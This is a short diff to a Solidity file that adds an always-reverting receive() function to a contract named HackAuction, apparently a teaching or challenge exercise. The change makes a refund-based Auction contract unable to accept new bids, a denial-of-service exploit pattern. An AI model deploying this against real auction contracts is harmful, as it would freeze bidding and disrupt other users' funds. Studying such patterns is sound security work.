@@ -17,6 +17,10 @@ contract Auction {
 }
 
 contract HackAuction {
+    receive() external payable {
+        revert();
+    }
+
     function hackBid(address payable auctionContract) public payable {
         (bool success, ) = auctionContract.call{value: msg.value}(abi.encodeWithSignature("bid()"));
         require(success, "Something went wrong");
